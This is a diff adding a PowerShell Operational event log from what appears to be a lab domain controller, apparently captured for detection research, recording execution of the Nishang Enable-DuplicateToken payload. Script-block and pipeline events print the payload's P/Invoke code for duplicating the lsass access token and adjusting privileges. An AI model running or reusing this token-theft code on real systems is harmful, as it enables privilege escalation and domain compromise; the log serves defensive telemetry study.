@@ -1,0 +1,1055 @@
+Log Name:      Microsoft-Windows-PowerShell/Operational
+Source:        Microsoft-Windows-PowerShell
+Date:          2/23/2025 5:56:20 PM
+Event ID:      4103
+Task Category: Executing Pipeline
+Level:         Information
+Keywords:      None
+User:          SYSTEM
+Computer:      DC.sccm.lab
+Description:
+CommandInvocation(Set-StrictMode): "Set-StrictMode"
+ParameterBinding(Set-StrictMode): name="Off"; value="True"
+
+
+Context:
+        Severity = Informational
+        Host Name = ConsoleHost
+        Host Version = 5.1.17763.6893
+        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
+        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+        Engine Version = 5.1.17763.6893
+        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
+        Pipeline ID = 77
+        Command Name = Set-StrictMode
+        Command Type = Cmdlet
+        Script Name = C:\Program Files\WindowsPowerShell\Modules\PSReadline\2.0.0\PSReadLine.psm1
+        Command Path = 
+        Sequence Number = 278
+        User = SCCMLAB\vagrant
+        Connected User = 
+        Shell ID = Microsoft.PowerShell
+
+
+User Data:
+
+
+Event Xml:
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+  <System>
+    <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
+    <EventID>4103</EventID>
+    <Version>1</Version>
+    <Level>4</Level>
+    <Task>106</Task>
+    <Opcode>20</Opcode>
+    <Keywords>0x0</Keywords>
+    <TimeCreated SystemTime="2025-02-24T01:56:20.018210100Z" />
+    <EventRecordID>14343</EventRecordID>
+    <Correlation ActivityID="{181f2766-865c-0000-4747-1f185c86db01}" />
+    <Execution ProcessID="2556" ThreadID="284" />
+    <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
+    <Computer>DC.sccm.lab</Computer>
+    <Security UserID="S-1-5-18" />
+  </System>
+  <EventData>
+    <Data Name="ContextInfo">        Severity = Informational
+        Host Name = ConsoleHost
+        Host Version = 5.1.17763.6893
+        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
+        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+        Engine Version = 5.1.17763.6893
+        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
+        Pipeline ID = 77
+        Command Name = Set-StrictMode
+        Command Type = Cmdlet
+        Script Name = C:\Program Files\WindowsPowerShell\Modules\PSReadline\2.0.0\PSReadLine.psm1
+        Command Path = 
+        Sequence Number = 278
+        User = SCCMLAB\vagrant
+        Connected User = 
+        Shell ID = Microsoft.PowerShell
+</Data>
+    <Data Name="UserData">
+    </Data>
+    <Data Name="Payload">CommandInvocation(Set-StrictMode): "Set-StrictMode"
+ParameterBinding(Set-StrictMode): name="Off"; value="True"
+</Data>
+  </EventData>
+</Event>
+
+Log Name:      Microsoft-Windows-PowerShell/Operational
+Source:        Microsoft-Windows-PowerShell
+Date:          2/23/2025 5:56:20 PM
+Event ID:      4103
+Task Category: Executing Pipeline
+Level:         Information
+Keywords:      None
+User:          SYSTEM
+Computer:      DC.sccm.lab
+Description:
+CommandInvocation(Out-Default): "Out-Default"
+
+
+Context:
+        Severity = Informational
+        Host Name = ConsoleHost
+        Host Version = 5.1.17763.6893
+        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
+        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+        Engine Version = 5.1.17763.6893
+        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
+        Pipeline ID = 75
+        Command Name = 
+        Command Type = Script
+        Script Name = 
+        Command Path = 
+        Sequence Number = 276
+        User = SCCMLAB\vagrant
+        Connected User = 
+        Shell ID = Microsoft.PowerShell
+
+
+User Data:
+
+
+Event Xml:
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+  <System>
+    <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
+    <EventID>4103</EventID>
+    <Version>1</Version>
+    <Level>4</Level>
+    <Task>106</Task>
+    <Opcode>20</Opcode>
+    <Keywords>0x0</Keywords>
+    <TimeCreated SystemTime="2025-02-24T01:56:20.016428400Z" />
+    <EventRecordID>14342</EventRecordID>
+    <Correlation ActivityID="{181f2766-865c-0000-3e47-1f185c86db01}" />
+    <Execution ProcessID="2556" ThreadID="284" />
+    <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
+    <Computer>DC.sccm.lab</Computer>
+    <Security UserID="S-1-5-18" />
+  </System>
+  <EventData>
+    <Data Name="ContextInfo">        Severity = Informational
+        Host Name = ConsoleHost
+        Host Version = 5.1.17763.6893
+        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
+        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+        Engine Version = 5.1.17763.6893
+        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
+        Pipeline ID = 75
+        Command Name = 
+        Command Type = Script
+        Script Name = 
+        Command Path = 
+        Sequence Number = 276
+        User = SCCMLAB\vagrant
+        Connected User = 
+        Shell ID = Microsoft.PowerShell
+</Data>
+    <Data Name="UserData">
+    </Data>
+    <Data Name="Payload">CommandInvocation(Out-Default): "Out-Default"
+</Data>
+  </EventData>
+</Event>
+
+Log Name:      Microsoft-Windows-PowerShell/Operational
+Source:        Microsoft-Windows-PowerShell
+Date:          2/23/2025 5:56:20 PM
+Event ID:      4103
+Task Category: Executing Pipeline
+Level:         Information
+Keywords:      None
+User:          SCCMLAB\vagrant
+Computer:      DC.sccm.lab
+Description:
+CommandInvocation(Get-Process): "Get-Process"
+ParameterBinding(Get-Process): name="Name"; value="lsass"
+
+
+Context:
+        Severity = Informational
+        Host Name = ConsoleHost
+        Host Version = 5.1.17763.6893
+        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
+        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+        Engine Version = 5.1.17763.6893
+        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
+        Pipeline ID = 75
+        Command Name = Get-Process
+        Command Type = Cmdlet
+        Script Name = C:\Users\vagrant\Downloads\Commands\TokenDuplication\Enable-DuplicateToken.ps1
+        Command Path = 
+        Sequence Number = 274
+        User = SCCMLAB\vagrant
+        Connected User = 
+        Shell ID = Microsoft.PowerShell
+
+
+User Data:
+
+
+Event Xml:
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+  <System>
+    <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
+    <EventID>4103</EventID>
+    <Version>1</Version>
+    <Level>4</Level>
+    <Task>106</Task>
+    <Opcode>20</Opcode>
+    <Keywords>0x0</Keywords>
+    <TimeCreated SystemTime="2025-02-24T01:56:20.007810600Z" />
+    <EventRecordID>14341</EventRecordID>
+    <Correlation ActivityID="{181f2766-865c-0001-d83f-1f185c86db01}" />
+    <Execution ProcessID="2556" ThreadID="284" />
+    <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
+    <Computer>DC.sccm.lab</Computer>
+    <Security UserID="S-1-5-21-1995092367-784345370-2199465104-1000" />
+  </System>
+  <EventData>
+    <Data Name="ContextInfo">        Severity = Informational
+        Host Name = ConsoleHost
+        Host Version = 5.1.17763.6893
+        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
+        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+        Engine Version = 5.1.17763.6893
+        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
+        Pipeline ID = 75
+        Command Name = Get-Process
+        Command Type = Cmdlet
+        Script Name = C:\Users\vagrant\Downloads\Commands\TokenDuplication\Enable-DuplicateToken.ps1
+        Command Path = 
+        Sequence Number = 274
+        User = SCCMLAB\vagrant
+        Connected User = 
+        Shell ID = Microsoft.PowerShell
+</Data>
+    <Data Name="UserData">
+    </Data>
+    <Data Name="Payload">CommandInvocation(Get-Process): "Get-Process"
+ParameterBinding(Get-Process): name="Name"; value="lsass"
+</Data>
+  </EventData>
+</Event>
+
+Log Name:      Microsoft-Windows-PowerShell/Operational
+Source:        Microsoft-Windows-PowerShell
+Date:          2/23/2025 5:56:20 PM
+Event ID:      4103
+Task Category: Executing Pipeline
+Level:         Information
+Keywords:      None
+User:          SCCMLAB\vagrant
+Computer:      DC.sccm.lab
+Description:
+CommandInvocation(New-Object): "New-Object"
+ParameterBinding(New-Object): name="TypeName"; value="AdjPriv.AdjPriv+TOKEN_PRIVILEGES"
+
+
+Context:
+        Severity = Informational
+        Host Name = ConsoleHost
+        Host Version = 5.1.17763.6893
+        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
+        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+        Engine Version = 5.1.17763.6893
+        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
+        Pipeline ID = 75
+        Command Name = New-Object
+        Command Type = Cmdlet
+        Script Name = C:\Users\vagrant\Downloads\Commands\TokenDuplication\Enable-DuplicateToken.ps1
+        Command Path = 
+        Sequence Number = 272
+        User = SCCMLAB\vagrant
+        Connected User = 
+        Shell ID = Microsoft.PowerShell
+
+
+User Data:
+
+
+Event Xml:
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+  <System>
+    <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
+    <EventID>4103</EventID>
+    <Version>1</Version>
+    <Level>4</Level>
+    <Task>106</Task>
+    <Opcode>20</Opcode>
+    <Keywords>0x0</Keywords>
+    <TimeCreated SystemTime="2025-02-24T01:56:20.000345600Z" />
+    <EventRecordID>14340</EventRecordID>
+    <Correlation ActivityID="{181f2766-865c-0001-d73f-1f185c86db01}" />
+    <Execution ProcessID="2556" ThreadID="284" />
+    <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
+    <Computer>DC.sccm.lab</Computer>
+    <Security UserID="S-1-5-21-1995092367-784345370-2199465104-1000" />
+  </System>
+  <EventData>
+    <Data Name="ContextInfo">        Severity = Informational
+        Host Name = ConsoleHost
+        Host Version = 5.1.17763.6893
+        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
+        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+        Engine Version = 5.1.17763.6893
+        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
+        Pipeline ID = 75
+        Command Name = New-Object
+        Command Type = Cmdlet
+        Script Name = C:\Users\vagrant\Downloads\Commands\TokenDuplication\Enable-DuplicateToken.ps1
+        Command Path = 
+        Sequence Number = 272
+        User = SCCMLAB\vagrant
+        Connected User = 
+        Shell ID = Microsoft.PowerShell
+</Data>
+    <Data Name="UserData">
+    </Data>
+    <Data Name="Payload">CommandInvocation(New-Object): "New-Object"
+ParameterBinding(New-Object): name="TypeName"; value="AdjPriv.AdjPriv+TOKEN_PRIVILEGES"
+</Data>
+  </EventData>
+</Event>
+
+Log Name:      Microsoft-Windows-PowerShell/Operational
+Source:        Microsoft-Windows-PowerShell
+Date:          2/23/2025 5:56:19 PM
+Event ID:      4103
+Task Category: Executing Pipeline
+Level:         Information
+Keywords:      None
+User:          SCCMLAB\vagrant
+Computer:      DC.sccm.lab
+Description:
+CommandInvocation(New-Object): "New-Object"
+ParameterBinding(New-Object): name="TypeName"; value="AdjPriv.AdjPriv+TokPriv1Luid"
+
+
+Context:
+        Severity = Informational
+        Host Name = ConsoleHost
+        Host Version = 5.1.17763.6893
+        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
+        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+        Engine Version = 5.1.17763.6893
+        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
+        Pipeline ID = 75
+        Command Name = New-Object
+        Command Type = Cmdlet
+        Script Name = C:\Users\vagrant\Downloads\Commands\TokenDuplication\Enable-DuplicateToken.ps1
+        Command Path = 
+        Sequence Number = 270
+        User = SCCMLAB\vagrant
+        Connected User = 
+        Shell ID = Microsoft.PowerShell
+
+
+User Data:
+
+
+Event Xml:
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+  <System>
+    <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
+    <EventID>4103</EventID>
+    <Version>1</Version>
+    <Level>4</Level>
+    <Task>106</Task>
+    <Opcode>20</Opcode>
+    <Keywords>0x0</Keywords>
+    <TimeCreated SystemTime="2025-02-24T01:56:19.980313000Z" />
+    <EventRecordID>14339</EventRecordID>
+    <Correlation ActivityID="{181f2766-865c-0001-d63f-1f185c86db01}" />
+    <Execution ProcessID="2556" ThreadID="284" />
+    <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
+    <Computer>DC.sccm.lab</Computer>
+    <Security UserID="S-1-5-21-1995092367-784345370-2199465104-1000" />
+  </System>
+  <EventData>
+    <Data Name="ContextInfo">        Severity = Informational
+        Host Name = ConsoleHost
+        Host Version = 5.1.17763.6893
+        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
+        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+        Engine Version = 5.1.17763.6893
+        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
+        Pipeline ID = 75
+        Command Name = New-Object
+        Command Type = Cmdlet
+        Script Name = C:\Users\vagrant\Downloads\Commands\TokenDuplication\Enable-DuplicateToken.ps1
+        Command Path = 
+        Sequence Number = 270
+        User = SCCMLAB\vagrant
+        Connected User = 
+        Shell ID = Microsoft.PowerShell
+</Data>
+    <Data Name="UserData">
+    </Data>
+    <Data Name="Payload">CommandInvocation(New-Object): "New-Object"
+ParameterBinding(New-Object): name="TypeName"; value="AdjPriv.AdjPriv+TokPriv1Luid"
+</Data>
+  </EventData>
+</Event>
+
+Log Name:      Microsoft-Windows-PowerShell/Operational
+Source:        Microsoft-Windows-PowerShell
+Date:          2/23/2025 5:56:19 PM
+Event ID:      4103
+Task Category: Executing Pipeline
+Level:         Information
+Keywords:      None
+User:          SCCMLAB\vagrant
+Computer:      DC.sccm.lab
+Description:
+CommandInvocation(Add-Type): "Add-Type"
+ParameterBinding(Add-Type): name="MemberDefinition"; value="    [StructLayout(LayoutKind.Sequential, Pack = 1)] 
+     public struct TokPriv1Luid 
+     { 
+         public int Count; 
+         public long Luid; 
+         public int Attr; 
+     } 
+ 
+    public const int SE_PRIVILEGE_ENABLED = 0x00000002; 
+    public const int TOKEN_QUERY = 0x00000008; 
+    public const int TOKEN_ADJUST_PRIVILEGES = 0x00000020; 
+    public const UInt32 STANDARD_RIGHTS_REQUIRED = 0x000F0000; 
+ 
+    public const UInt32 STANDARD_RIGHTS_READ = 0x00020000; 
+    public const UInt32 TOKEN_ASSIGN_PRIMARY = 0x0001; 
+    public const UInt32 TOKEN_DUPLICATE = 0x0002; 
+    public const UInt32 TOKEN_IMPERSONATE = 0x0004; 
+    public const UInt32 TOKEN_QUERY_SOURCE = 0x0010; 
+    public const UInt32 TOKEN_ADJUST_GROUPS = 0x0040; 
+    public const UInt32 TOKEN_ADJUST_DEFAULT = 0x0080; 
+    public const UInt32 TOKEN_ADJUST_SESSIONID = 0x0100; 
+    public const UInt32 TOKEN_READ = (STANDARD_RIGHTS_READ | TOKEN_QUERY); 
+    public const UInt32 TOKEN_ALL_ACCESS = (STANDARD_RIGHTS_REQUIRED | TOKEN_ASSIGN_PRIMARY | 
+      TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY | TOKEN_QUERY_SOURCE | 
+      TOKEN_ADJUST_PRIVILEGES | TOKEN_ADJUST_GROUPS | TOKEN_ADJUST_DEFAULT | 
+      TOKEN_ADJUST_SESSIONID); 
+ 
+    public const string SE_TIME_ZONE_NAMETEXT = "SeTimeZonePrivilege"; 
+    public const int ANYSIZE_ARRAY = 1; 
+ 
+    [StructLayout(LayoutKind.Sequential)] 
+    public struct LUID 
+    { 
+      public UInt32 LowPart; 
+      public UInt32 HighPart; 
+    } 
+ 
+    [StructLayout(LayoutKind.Sequential)] 
+    public struct LUID_AND_ATTRIBUTES { 
+       public LUID Luid; 
+       public UInt32 Attributes; 
+    } 
+ 
+ 
+    public struct TOKEN_PRIVILEGES { 
+      public UInt32 PrivilegeCount; 
+      [MarshalAs(UnmanagedType.ByValArray, SizeConst=ANYSIZE_ARRAY)] 
+      public LUID_AND_ATTRIBUTES [] Privileges; 
+    } 
+ 
+    [DllImport("advapi32.dll", SetLastError=true)] 
+     public extern static bool DuplicateToken(IntPtr ExistingTokenHandle, int 
+        SECURITY_IMPERSONATION_LEVEL, out IntPtr DuplicateTokenHandle); 
+ 
+ 
+    [DllImport("advapi32.dll", SetLastError=true)] 
+    [return: MarshalAs(UnmanagedType.Bool)] 
+    public static extern bool SetThreadToken( 
+      IntPtr PHThread, 
+      IntPtr Token 
+    ); 
+ 
+    [DllImport("advapi32.dll", SetLastError=true)] 
+     [return: MarshalAs(UnmanagedType.Bool)] 
+      public static extern bool OpenProcessToken(IntPtr ProcessHandle,  
+       UInt32 DesiredAccess, out IntPtr TokenHandle); 
+ 
+    [DllImport("advapi32.dll", SetLastError = true)] 
+    public static extern bool LookupPrivilegeValue(string host, string name, ref long pluid); 
+ 
+    [DllImport("kernel32.dll", ExactSpelling = true)] 
+    public static extern IntPtr GetCurrentProcess(); 
+ 
+    [DllImport("advapi32.dll", ExactSpelling = true, SetLastError = true)] 
+     public static extern bool AdjustTokenPrivileges(IntPtr htok, bool disall, 
+     ref TokPriv1Luid newst, int len, IntPtr prev, IntPtr relen); , ..."
+ParameterBinding(Add-Type): name="Name"; value="AdjPriv"
+ParameterBinding(Add-Type): name="Namespace"; value="AdjPriv"
+
+
+Context:
+        Severity = Informational
+        Host Name = ConsoleHost
+        Host Version = 5.1.17763.6893
+        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
+        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+        Engine Version = 5.1.17763.6893
+        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
+        Pipeline ID = 75
+        Command Name = Add-Type
+        Command Type = Cmdlet
+        Script Name = C:\Users\vagrant\Downloads\Commands\TokenDuplication\Enable-DuplicateToken.ps1
+        Command Path = 
+        Sequence Number = 268
+        User = SCCMLAB\vagrant
+        Connected User = 
+        Shell ID = Microsoft.PowerShell
+
+
+User Data:
+
+
+Event Xml:
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+  <System>
+    <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
+    <EventID>4103</EventID>
+    <Version>1</Version>
+    <Level>4</Level>
+    <Task>106</Task>
+    <Opcode>20</Opcode>
+    <Keywords>0x0</Keywords>
+    <TimeCreated SystemTime="2025-02-24T01:56:19.977542000Z" />
+    <EventRecordID>14338</EventRecordID>
+    <Correlation ActivityID="{181f2766-865c-0000-4247-1f185c86db01}" />
+    <Execution ProcessID="2556" ThreadID="284" />
+    <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
+    <Computer>DC.sccm.lab</Computer>
+    <Security UserID="S-1-5-21-1995092367-784345370-2199465104-1000" />
+  </System>
+  <EventData>
+    <Data Name="ContextInfo">        Severity = Informational
+        Host Name = ConsoleHost
+        Host Version = 5.1.17763.6893
+        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
+        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+        Engine Version = 5.1.17763.6893
+        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
+        Pipeline ID = 75
+        Command Name = Add-Type
+        Command Type = Cmdlet
+        Script Name = C:\Users\vagrant\Downloads\Commands\TokenDuplication\Enable-DuplicateToken.ps1
+        Command Path = 
+        Sequence Number = 268
+        User = SCCMLAB\vagrant
+        Connected User = 
+        Shell ID = Microsoft.PowerShell
+</Data>
+    <Data Name="UserData">
+    </Data>
+    <Data Name="Payload">CommandInvocation(Add-Type): "Add-Type"
+ParameterBinding(Add-Type): name="MemberDefinition"; value="    [StructLayout(LayoutKind.Sequential, Pack = 1)] 
+     public struct TokPriv1Luid 
+     { 
+         public int Count; 
+         public long Luid; 
+         public int Attr; 
+     } 
+ 
+    public const int SE_PRIVILEGE_ENABLED = 0x00000002; 
+    public const int TOKEN_QUERY = 0x00000008; 
+    public const int TOKEN_ADJUST_PRIVILEGES = 0x00000020; 
+    public const UInt32 STANDARD_RIGHTS_REQUIRED = 0x000F0000; 
+ 
+    public const UInt32 STANDARD_RIGHTS_READ = 0x00020000; 
+    public const UInt32 TOKEN_ASSIGN_PRIMARY = 0x0001; 
+    public const UInt32 TOKEN_DUPLICATE = 0x0002; 
+    public const UInt32 TOKEN_IMPERSONATE = 0x0004; 
+    public const UInt32 TOKEN_QUERY_SOURCE = 0x0010; 
+    public const UInt32 TOKEN_ADJUST_GROUPS = 0x0040; 
+    public const UInt32 TOKEN_ADJUST_DEFAULT = 0x0080; 
+    public const UInt32 TOKEN_ADJUST_SESSIONID = 0x0100; 
+    public const UInt32 TOKEN_READ = (STANDARD_RIGHTS_READ | TOKEN_QUERY); 
+    public const UInt32 TOKEN_ALL_ACCESS = (STANDARD_RIGHTS_REQUIRED | TOKEN_ASSIGN_PRIMARY | 
+      TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY | TOKEN_QUERY_SOURCE | 
+      TOKEN_ADJUST_PRIVILEGES | TOKEN_ADJUST_GROUPS | TOKEN_ADJUST_DEFAULT | 
+      TOKEN_ADJUST_SESSIONID); 
+ 
+    public const string SE_TIME_ZONE_NAMETEXT = "SeTimeZonePrivilege"; 
+    public const int ANYSIZE_ARRAY = 1; 
+ 
+    [StructLayout(LayoutKind.Sequential)] 
+    public struct LUID 
+    { 
+      public UInt32 LowPart; 
+      public UInt32 HighPart; 
+    } 
+ 
+    [StructLayout(LayoutKind.Sequential)] 
+    public struct LUID_AND_ATTRIBUTES { 
+       public LUID Luid; 
+       public UInt32 Attributes; 
+    } 
+ 
+ 
+    public struct TOKEN_PRIVILEGES { 
+      public UInt32 PrivilegeCount; 
+      [MarshalAs(UnmanagedType.ByValArray, SizeConst=ANYSIZE_ARRAY)] 
+      public LUID_AND_ATTRIBUTES [] Privileges; 
+    } 
+ 
+    [DllImport("advapi32.dll", SetLastError=true)] 
+     public extern static bool DuplicateToken(IntPtr ExistingTokenHandle, int 
+        SECURITY_IMPERSONATION_LEVEL, out IntPtr DuplicateTokenHandle); 
+ 
+ 
+    [DllImport("advapi32.dll", SetLastError=true)] 
+    [return: MarshalAs(UnmanagedType.Bool)] 
+    public static extern bool SetThreadToken( 
+      IntPtr PHThread, 
+      IntPtr Token 
+    ); 
+ 
+    [DllImport("advapi32.dll", SetLastError=true)] 
+     [return: MarshalAs(UnmanagedType.Bool)] 
+      public static extern bool OpenProcessToken(IntPtr ProcessHandle,  
+       UInt32 DesiredAccess, out IntPtr TokenHandle); 
+ 
+    [DllImport("advapi32.dll", SetLastError = true)] 
+    public static extern bool LookupPrivilegeValue(string host, string name, ref long pluid); 
+ 
+    [DllImport("kernel32.dll", ExactSpelling = true)] 
+    public static extern IntPtr GetCurrentProcess(); 
+ 
+    [DllImport("advapi32.dll", ExactSpelling = true, SetLastError = true)] 
+     public static extern bool AdjustTokenPrivileges(IntPtr htok, bool disall, 
+     ref TokPriv1Luid newst, int len, IntPtr prev, IntPtr relen); , ..."
+ParameterBinding(Add-Type): name="Name"; value="AdjPriv"
+ParameterBinding(Add-Type): name="Namespace"; value="AdjPriv"
+</Data>
+  </EventData>
+</Event>
+
+Log Name:      Microsoft-Windows-PowerShell/Operational
+Source:        Microsoft-Windows-PowerShell
+Date:          2/23/2025 5:56:19 PM
+Event ID:      4103
+Task Category: Executing Pipeline
+Level:         Information
+Keywords:      None
+User:          SCCMLAB\vagrant
+Computer:      DC.sccm.lab
+Description:
+CommandInvocation(New-Object): "New-Object"
+ParameterBinding(New-Object): name="TypeName"; value="Security.Principal.WindowsPrincipal"
+ParameterBinding(New-Object): name="ArgumentList"; value="System.Security.Principal.WindowsIdentity"
+
+
+Context:
+        Severity = Informational
+        Host Name = ConsoleHost
+        Host Version = 5.1.17763.6893
+        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
+        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+        Engine Version = 5.1.17763.6893
+        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
+        Pipeline ID = 75
+        Command Name = New-Object
+        Command Type = Cmdlet
+        Script Name = C:\Users\vagrant\Downloads\Commands\TokenDuplication\Enable-DuplicateToken.ps1
+        Command Path = 
+        Sequence Number = 266
+        User = SCCMLAB\vagrant
+        Connected User = 
+        Shell ID = Microsoft.PowerShell
+
+
+User Data:
+
+
+Event Xml:
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+  <System>
+    <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
+    <EventID>4103</EventID>
+    <Version>1</Version>
+    <Level>4</Level>
+    <Task>106</Task>
+    <Opcode>20</Opcode>
+    <Keywords>0x0</Keywords>
+    <TimeCreated SystemTime="2025-02-24T01:56:19.837312200Z" />
+    <EventRecordID>14337</EventRecordID>
+    <Correlation ActivityID="{181f2766-865c-0000-4147-1f185c86db01}" />
+    <Execution ProcessID="2556" ThreadID="284" />
+    <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
+    <Computer>DC.sccm.lab</Computer>
+    <Security UserID="S-1-5-21-1995092367-784345370-2199465104-1000" />
+  </System>
+  <EventData>
+    <Data Name="ContextInfo">        Severity = Informational
+        Host Name = ConsoleHost
+        Host Version = 5.1.17763.6893
+        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
+        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+        Engine Version = 5.1.17763.6893
+        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
+        Pipeline ID = 75
+        Command Name = New-Object
+        Command Type = Cmdlet
+        Script Name = C:\Users\vagrant\Downloads\Commands\TokenDuplication\Enable-DuplicateToken.ps1
+        Command Path = 
+        Sequence Number = 266
+        User = SCCMLAB\vagrant
+        Connected User = 
+        Shell ID = Microsoft.PowerShell
+</Data>
+    <Data Name="UserData">
+    </Data>
+    <Data Name="Payload">CommandInvocation(New-Object): "New-Object"
+ParameterBinding(New-Object): name="TypeName"; value="Security.Principal.WindowsPrincipal"
+ParameterBinding(New-Object): name="ArgumentList"; value="System.Security.Principal.WindowsIdentity"
+</Data>
+  </EventData>
+</Event>
+
+Log Name:      Microsoft-Windows-PowerShell/Operational
+Source:        Microsoft-Windows-PowerShell
+Date:          2/23/2025 5:56:19 PM
+Event ID:      4104
+Task Category: Execute a Remote Command
+Level:         Warning
+Keywords:      None
+User:          SCCMLAB\vagrant
+Computer:      DC.sccm.lab
+Description:
+Creating Scriptblock text (1 of 1):
+
+
+function Enable-DuplicateToken 
+{
+<# 
+.SYNOPSIS 
+Nishang payload which duplicates the Access token of lsass and sets it in the current process thread. 
+ 
+.DESCRIPTION 
+This payload duplicates the Access token of lsass and sets it in the current process thread. 
+The payload must be run with elevated permissions. 
+
+.EXAMPLE 
+PS > Enable-DuplicateToken
+ 
+.LINK 
+http://www.truesec.com 
+http://blogs.technet.com/b/heyscriptingguy/archive/2012/07/05/use-powershell-to-duplicate-process-tokens-via-p-invoke.aspx
+https://github.com/samratashok/nishang
+
+.NOTES 
+Goude 2012, TreuSec 
+#>  
+    [CmdletBinding()] 
+    param() 
+ 
+    $signature = @" 
+    [StructLayout(LayoutKind.Sequential, Pack = 1)] 
+     public struct TokPriv1Luid 
+     { 
+         public int Count; 
+         public long Luid; 
+         public int Attr; 
+     } 
+ 
+    public const int SE_PRIVILEGE_ENABLED = 0x00000002; 
+    public const int TOKEN_QUERY = 0x00000008; 
+    public const int TOKEN_ADJUST_PRIVILEGES = 0x00000020; 
+    public const UInt32 STANDARD_RIGHTS_REQUIRED = 0x000F0000; 
+ 
+    public const UInt32 STANDARD_RIGHTS_READ = 0x00020000; 
+    public const UInt32 TOKEN_ASSIGN_PRIMARY = 0x0001; 
+    public const UInt32 TOKEN_DUPLICATE = 0x0002; 
+    public const UInt32 TOKEN_IMPERSONATE = 0x0004; 
+    public const UInt32 TOKEN_QUERY_SOURCE = 0x0010; 
+    public const UInt32 TOKEN_ADJUST_GROUPS = 0x0040; 
+    public const UInt32 TOKEN_ADJUST_DEFAULT = 0x0080; 
+    public const UInt32 TOKEN_ADJUST_SESSIONID = 0x0100; 
+    public const UInt32 TOKEN_READ = (STANDARD_RIGHTS_READ | TOKEN_QUERY); 
+    public const UInt32 TOKEN_ALL_ACCESS = (STANDARD_RIGHTS_REQUIRED | TOKEN_ASSIGN_PRIMARY | 
+      TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY | TOKEN_QUERY_SOURCE | 
+      TOKEN_ADJUST_PRIVILEGES | TOKEN_ADJUST_GROUPS | TOKEN_ADJUST_DEFAULT | 
+      TOKEN_ADJUST_SESSIONID); 
+ 
+    public const string SE_TIME_ZONE_NAMETEXT = "SeTimeZonePrivilege"; 
+    public const int ANYSIZE_ARRAY = 1; 
+ 
+    [StructLayout(LayoutKind.Sequential)] 
+    public struct LUID 
+    { 
+      public UInt32 LowPart; 
+      public UInt32 HighPart; 
